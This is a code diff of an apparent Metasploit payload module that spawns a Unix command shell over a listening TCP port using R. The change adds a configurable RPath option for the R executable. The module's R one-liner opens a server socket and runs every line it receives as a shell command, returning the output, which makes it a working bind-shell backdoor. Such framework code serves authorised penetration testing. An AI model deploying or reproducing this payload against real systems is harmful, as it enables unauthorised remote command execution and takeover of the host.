@@ -14,18 +14,23 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Unix Command Shell, Bind TCP (via R)',
-      'Description' => 'Continually listen for a connection and spawn a command shell via R',
-      'Author'      => [ 'RageLtMan <rageltman[at]sempervictus>' ],
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'unix',
-      'Arch'        => ARCH_CMD,
-      'Handler'     => Msf::Handler::BindTcp,
-      'Session'     => Msf::Sessions::CommandShell,
-      'PayloadType' => 'cmd',
-      'RequiredCmd' => 'R',
-      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
-    ))
+     'Name'        => 'Unix Command Shell, Bind TCP (via R)',
+     'Description' => 'Continually listen for a connection and spawn a command shell via R',
+     'Author'      => [ 'RageLtMan <rageltman[at]sempervictus>' ],
+     'License'     => MSF_LICENSE,
+     'Platform'    => 'unix',
+     'Arch'        => ARCH_CMD,
+     'Handler'     => Msf::Handler::BindTcp,
+     'Session'     => Msf::Sessions::CommandShell,
+     'PayloadType' => 'cmd',
+     'RequiredCmd' => 'R',
+     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
+          ))
+    register_advanced_options(
+      [
+        OptString.new('RPath', [true, 'The path to the R executable', 'R'])
+      ]
+    )
   end
 
   def generate(_opts = {})
@@ -33,12 +38,12 @@ module MetasploitModule
   end
 
   def prepends(r_string)
-   return "R -e \"#{r_string}\""
+    return "#{datastore['RPath']} -e \"#{r_string}\""
   end
 
   def r_string
     return "s<-socketConnection(port=#{datastore['LPORT']}," +
-    "blocking=TRUE,server=TRUE,open='r+');while(TRUE){writeLines(readLines" +
-    "(pipe(readLines(s,1))),s)}"
+      "blocking=TRUE,server=TRUE,open='r+');while(TRUE){writeLines(readLines" +
+      "(pipe(readLines(s,1))),s)}"
   end
 end
